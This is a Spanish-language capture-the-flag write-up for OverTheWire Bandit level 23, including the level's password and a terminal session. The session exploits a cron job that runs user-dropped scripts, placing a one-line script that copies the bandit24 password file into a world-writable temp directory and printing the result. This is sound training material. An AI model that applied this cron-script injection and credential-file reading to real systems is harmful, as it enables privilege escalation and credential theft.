## Objetivo 
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
## Datos de Acceso al Nivel
user: bandit23
password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga

## Solución
```bash
└─$ ssh bandit23@bandit.labs.overthewire.org -p2220 
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

bandit23@bandit.labs.overthewire.org's password: 

bandit23@bandit:~$ whoami
bandit23
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ mktemp -d
/tmp/tmp.yUXb8US4X8
bandit23@bandit:~$ chmod 777 /tmp/tmp.Xh9c5GpR3S
bandit23@bandit:~$ cd /tmp/tmp.Xh9c5GpR3S
bandit23@bandit:/tmp/tmp.Xh9c5GpR3S$ echo "cat /etc/bandit_pass/bandit24 > /tmp/tmp.Xh9c5GpR3S/password" > script.sh
bandit23@bandit:/tmp/tmp.Xh9c5GpR3S$ /tmp/tmp.Xh9c5GpR3S$ cat script.sh
-bash: /tmp/tmp.Xh9c5GpR3S$: No such file or directory
bandit23@bandit:/tmp/tmp.Xh9c5GpR3S$ cat script.sh
cat /etc/bandit_pass/bandit24 > /tmp/tmp.Xh9c5GpR3S/password
bandit23@bandit:/tmp/tmp.Xh9c5GpR3S$ touch password
bandit23@bandit:/tmp/tmp.Xh9c5GpR3S$ chmod 777 password
bandit23@bandit:/tmp/tmp.Xh9c5GpR3S$ ls -la
total 10820
drwxrwxrwx    2 bandit23 bandit23     4096 Sep  4 22:19 .
drwxrwx-wt 4367 root     root     11063296 Sep  4 22:20 ..
-rwxrwxrwx    1 bandit23 bandit23       33 Sep  4 22:19 password
-rwxrwxrwx    1 bandit23 bandit23       61 Sep  4 22:16 script.sh
bandit23@bandit:/tmp/tmp.Xh9c5GpR3S$ chmod 777 script.sh
bandit23@bandit:/tmp/tmp.Xh9c5GpR3S$ ls -la
total 10820
drwxrwxrwx    2 bandit23 bandit23     4096 Sep  4 22:19 .
drwxrwx-wt 4367 root     root     11063296 Sep  4 22:20 ..
-rwxrwxrwx    1 bandit23 bandit23       33 Sep  4 22:19 password
-rwxrwxrwx    1 bandit23 bandit23       61 Sep  4 22:16 script.sh
bandit23@bandit:/tmp/tmp.Xh9c5GpR3S$ pwd
/tmp/tmp.Xh9c5GpR3S
bandit23@bandit:/tmp/tmp.Xh9c5GpR3S$ cat script.sh
cat /etc/bandit_pass/bandit24 > /tmp/tmp.Xh9c5GpR3S/password
bandit23@bandit:/tmp/tmp.Xh9c5GpR3S$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmp.Xh9c5GpR3S$ cat password
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
bandit23@bandit:/tmp/tmp.Xh9c5GpR3S$ 

```

## Notas Adicionales
**mktemp -d**
**Genera un nombre único:** mktemp -d crea un nombre único para el directorio temporal, asegurando que no haya conflictos con directorios existentes.

**Crea el directorio:** Crea el directorio en el sistema de archivos con el nombre único generado.

**Devuelve la ruta:** Imprime la ruta completa del directorio temporal creado en la salida estándar (la pantalla del terminal). Puedes redirigir esta salida o almacenarla en una variable si lo necesitas para usar el directorio temporal en scripts.

## Referencias 

[How Do I Use mktemp? | Baeldung on Linux](https://www.baeldung.com/linux/mktemp-command)